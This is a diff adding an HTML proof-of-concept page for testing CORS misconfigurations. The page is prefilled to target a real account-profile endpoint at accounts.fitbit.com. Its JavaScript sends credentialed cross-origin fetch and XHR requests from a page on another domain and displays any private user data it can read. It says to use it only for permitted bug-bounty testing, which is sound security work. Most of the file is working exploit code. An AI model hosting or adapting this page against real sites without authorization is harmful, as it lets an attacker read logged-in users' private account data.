@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>CORS PoC (withCredentials)</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; margin: 16px; }
+    h1 { font-size: 20px; margin: 0 0 12px; }
+    .card { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin-bottom: 12px; }
+    label { display: block; font-weight: 600; margin: 8px 0 4px; }
+    input[type="text"] { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; }
+    button { padding: 10px 14px; border: 1px solid #ccc; border-radius: 8px; background: #f7f7f7; }
+    pre { white-space: pre-wrap; word-wrap: break-word; background: #fafafa; border: 1px solid #eee; border-radius: 6px; padding: 8px; max-height: 45vh; overflow:auto; }
+    code { background: #f3f3f3; padding: 2px 4px; border-radius: 4px; }
+    .row { display: flex; gap: 8px; align-items: center; }
+    .row > * { flex: 1; }
+    small { color: #555; }
+  </style>
+</head>
+<body>
+  <h1>CORS PoC (withCredentials)</h1>
+  <div class="card">
+    <p><strong>How to use:</strong> Host this file on a domain you control (e.g., GitHub Pages). While you are logged in on the target site in the same browser, open this page and click <em>Run test</em>. This PoC tries to read a protected resource using <code>credentials: 'include'</code>.</p>
+    <p><strong>Only test on assets where you have permission (bug bounty / your own account).</strong></p>
+  </div>
+
+  <div class="card">
+    <label for="url">Target URL</label>
+    <input id="url" type="text" value="https://accounts.fitbit.com/profile">
+    <div class="row" style="margin-top:8px;">
+      <button id="run">Run test (fetch)</button>
+      <button id="run-xhr">Run test (XHR)</button>
+    </div>
+    <small>Tip: try different endpoints that return user-specific data.</small>
+  </div>
+
+  <div class="card">
+    <div><strong>Page Origin:</strong> <code id="origin"></code></div>
+    <div><strong>Status:</strong> <code id="status">idle</code></div>
+    <div><strong>Notes:</strong> <span id="notes">Waiting…</span></div>
+  </div>
+
+  <div class="card">
+    <div><strong>Response Headers (visible to JS):</strong></div>
+    <pre id="headers"></pre>
+  </div>
+
+  <div class="card">
+    <div><strong>Response Body (first 10000 chars):</strong></div>
+    <pre id="body"></pre>
+  </div>
+
+<script>
+  const $ = (id) => document.getElementById(id);
+  $("origin").textContent = window.location.origin;
+
+  function setStatus(s){ $("status").textContent = s; }
+  function setNotes(n){ $("notes").textContent = n; }
+  function showHeaders(headers){
+    let out = "";
+    for (const [k,v] of headers.entries()) out += k + ": " + v + "\\n";
+    $("headers").textContent = out || "(none exposed)";
+  }
+  function showBody(text){
+    $("body").textContent = text.slice(0, 10000);
+  }
+
+  async function runFetch(){
+    const url = $("url").value.trim();
+    setStatus("running (fetch)");
+    setNotes("Sending cross-origin request with credentials...");
+    $("headers").textContent = ""; $("body").textContent = "";
+    try {
+      const res = await fetch(url, {
+        method: "GET",
+        mode: "cors",
+        credentials: "include"
+      });
+      setStatus(res.status + " " + res.statusText);
+      showHeaders(res.headers);
+      const text = await res.text();
+      showBody(text);
+      if (text && res.ok) {
+        setNotes("If you can see private user data here, CORS is likely misconfigured for your origin.");
+      } else {
+        setNotes("Either the endpoint is public, blocked by CORS, or returned no body.");
+      }
+    } catch (e) {
+      setStatus("error");
+      setNotes(e && e.message ? e.message : String(e));
+    }
+  }
+
+  function runXHR(){
+    const url = $("url").value.trim();
+    setStatus("running (XHR)");
+    setNotes("Sending cross-origin XHR with withCredentials...");
+    $("headers").textContent = ""; $("body").textContent = "";
+
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      xhr.withCredentials = true;
+      xhr.onreadystatechange = function(){
+        if (xhr.readyState === 4){
+          setStatus(xhr.status + " " + (xhr.statusText || ""));
+          // Try to show response headers (may be limited by CORS)
+          try {
+            $("headers").textContent = xhr.getAllResponseHeaders();
+          } catch(_){}
+          try {
+            showBody(xhr.responseText || "");
+          } catch(e){
+            $("body").textContent = "(response not readable: " + (e.message || e) + ")";
+          }
+          if (xhr.status >= 200 && xhr.status < 400 && xhr.responseText){
+            setNotes("If the response contains private data and is readable here, it confirms impact.");
+          } else {
+            setNotes("Response not readable or blocked by CORS / no sensitive data.");
+          }
+        }
+      };
+      xhr.onerror = function(){ setStatus("network error"); setNotes("Network/CORS error."); };
+      xhr.send();
+    } catch(e){
+      setStatus("error");
+      setNotes(e && e.message ? e.message : String(e));
+    }
+  }
+
+  $("run").addEventListener("click", runFetch);
+  $("run-xhr").addEventListener("click", runXHR);
+</script>
+</body>
+</html>
